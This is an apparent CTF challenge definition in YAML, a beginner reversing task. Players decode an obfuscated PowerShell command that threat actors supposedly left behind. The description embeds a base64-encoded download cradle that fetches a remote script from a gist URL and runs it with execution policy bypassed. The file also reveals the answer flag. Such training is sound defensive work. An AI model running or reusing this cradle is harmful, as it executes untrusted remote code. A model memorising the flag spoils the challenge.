@@ -1,0 +1,28 @@
+attempts: 0
+author: Todd Brecher
+category: REVERSING
+description: 'Threat actors in your organization have struck again and left behind
+  a strange command:<br>powershell -exec bypass -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAcwB0AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBTAHUAcABlAHIATQBhAHMAdABlAHIASABhAGMAawBlAHIANAA5ADAAMgA0ADcAMwAyAC8AYgA2AGEAZgA4ADcAZgAyAGUAZgA2AGIANQA3AGIAZgAxADUAMwBkADMAOAA0ADQANwA0ADUAOQBiAGQANABhAC8AcgBhAHcALwA4AGUAMAA1AGYAYQBjADcAYgBkAGIANQBjADEAYwA5ADEAYwA4ADcAYwBmADkANAAxADIAMgA5ADkAOQA4AGEANwBmAGIAMwBmADcANwBmAC8AcABvAHcAcABvAHcALgBwAHMAMQAnACkAOwBJAG4AdgBvAGsAZQAtAEYAdQBuAGMA"<br>The
+  incident response team has no idea how to interpret this command. Can you help them
+  understand what this command does and the text it prints out?<br>Flag format: MonkeyCTF{TextPrintedOut}'
+extra:
+  decay: 30
+  initial: 100
+  minimum: 30
+files:
+- KPMGPowerShell.zip
+flags:
+- monkeyCTF{MalwareMustRun}
+hints:
+- content: 'It is common for powershell to contain Base64 encoded text. You may want
+    to decode everything you find as you trace the source of what is executed. '
+  cost: 0
+name: 'KPMG: Power Shell'
+requirements:
+- CoC
+state: visible
+tags:
+- beginner
+type: dynamic
+value: 100
+version: '0.1'
